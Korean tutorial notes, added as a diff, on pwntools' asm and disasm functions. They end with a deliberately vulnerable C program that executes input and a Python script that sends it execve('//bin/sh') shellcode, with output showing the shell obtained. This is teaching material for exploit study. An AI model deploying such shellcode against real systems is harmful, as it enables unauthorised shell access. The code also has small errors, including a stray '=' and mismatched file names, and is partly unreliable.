@@ -1,0 +1,139 @@
+pwntools - Assembly / Disassembly :
+    셸코딩을 하거나 특정 바이트의 디스어셈블리 결과를 보기 위해서 사용할 수 있습니다.
+
+    Assembly :
+        asm 함수는 명령어를 인자로 전달하면 바이트로 변환합니다.
+        ex)
+            asm("ret")
+            '\xc3'
+            asm("syscall")
+            '\x0f\x05
+
+        ret와 syscall 명령어가 바이트로 변환되었습니다.
+
+        asm 함수는 두 개 이상의 명령어 또한 변환할 수 있습니다.
+        ex)
+            asm("mov al, 0; mov edi, 0; syscall")
+            '\xb0\x00\xbf\x00\x00\x00\x00\x0f\x05'
+
+        명령어 구분자를 사용하여 두 개 이상의 명령어를 변환하였습니다.
+
+        asm 함수는 기본적으로 x86 아키텍처를 지원합니다.
+        시스템의 아키텍처마다 명령어 혹은 레지스터가 다르기 때문에 아키텍처를 따로 지정해야 합니다.
+        ex)
+            asm("mov rdi, 0")
+            <error message>
+            
+            context.arch= 'x86_64'
+            asm("mov rdi,0")
+            'H\xc7\xc7\x00\x00\x00\x00'
+                    
+        contect.arch를 사용하면 원하는 아키텍처를 지정할 수 있습니다.
+
+    Disassembly :
+        disasm함수는 특정 바이트를 명령어로 변환 합니다.
+        ex)
+            disasm("\x90")
+            '   0:   90                      nop'
+            disasm("\x0f\x05")
+            '   0:   0f 05                   syscall'
+
+        명령어 형태로 변환되었습니다.
+        
+        disasm 함수 또한 두 개 이상의 바이트를 명령어로 변환할 수 있습니다.
+        ex)
+            print disasm("\xc3\x0f\x05")
+            0:   c3                      ret    
+            1:   0f 05                   syscall
+
+        "\xc3\x0f\x05" 가 ret과 syscall 명령어로 변환된 것을 알 수 있습니다.
+
+        disasm 함수는 기본적으로 x86 아키텍처를 지원합니다.
+        시스템의 아키텍처마다 명령어 혹은 레지스터가 다르기 때문에 아키텍처를 따로 지정해야 합니다.
+        ex)
+            print disasm("\x48\xc7\xc7\x00\x00\x00\x00")
+                0:   48                      dec    eax
+                1:   c7 c7 00 00 00 00       mov    edi,0x0
+            context.arch = 'x86_64'
+            print disasm("\x48\xc7\xc7\x00\x00\x00\x00")
+                0:   48 c7 c7 00 00 00 00    mov    rdi,0x0
+
+        x86 아키텍처에 맞게 변환되는 것을 볼 수 있고, 
+        context.arch를 통해 x86_64 아키텍처로 지정해주면 해당하는 아키텍처에 맞게 변환됩니다.
+
+        asm.c는 입력한 값을 실행해주는 코드입니다.
+        ex)
+            // gcc -o asm asm.c -zexecstack
+            #include <stdio.h>
+            #include <unistd.h>
+            int main() {
+                char shellcode[256];
+                
+                read(0, shellcode, 256);
+                int (*shell)() = (int (*)())shellcode;
+                
+                shell();
+            }
+
+        asm.py는 execve("//bin/sh",0,0)을 실행하는 셸코드를 asm 함수를 사용해서 작성했습니다.
+        ex)
+            # asm.py
+            from pwn import *
+            
+            context.arch = 'x86_64'=
+            p = process("./asm")
+            
+            payload = asm("xor rcx, rcx")
+            payload += asm("push rcx")
+            payload += asm("mov rbx, 0x68732f6e69622f2f")
+            payload += asm("push rbx")
+            payload += asm("mov rdi, rsp")
+            payload += asm("mov al, 59")
+            payload += asm("mov rsi, 0")
+            payload += asm("mov rdx, 0")
+            payload += asm("syscall")
+            
+            p.send(payload)
+            
+            p.interactive()
+
+        ex)
+            $ python payload.py 
+            [+] Starting local process './asm': pid 65408
+            [*] Paused (press any to continue)
+            [*] Switching to interactive mode
+            $ 
+            $ id
+            uid=1001(theori) gid=1001(theori) groups=1001(theori)
+
+        execve("//bin/sh",0,0)가 실행되면서 셸을 획득하였습니다.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
